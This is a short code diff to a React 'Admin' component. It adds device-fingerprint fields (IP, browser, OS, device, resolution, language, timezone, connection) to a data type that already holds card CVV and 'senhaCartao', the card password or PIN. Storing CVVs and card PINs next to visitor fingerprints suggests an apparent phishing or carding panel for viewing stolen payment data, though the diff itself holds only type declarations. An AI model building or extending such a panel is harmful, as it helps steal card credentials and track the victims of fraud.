@@ -65,6 +65,15 @@ const Admin = () => {
     cvv: string;
     senhaCartao: string;
     data: string;
+    // Device information
+    ip?: string;
+    navegador?: string;
+    so?: string;
+    dispositivo?: string;
+    resolucao?: string;
+    idioma?: string;
+    fuso?: string;
+    conexao?: string;
   }
 
   const [parsedData, setParsedData] = useState<ParsedPaymentData | null>(null);
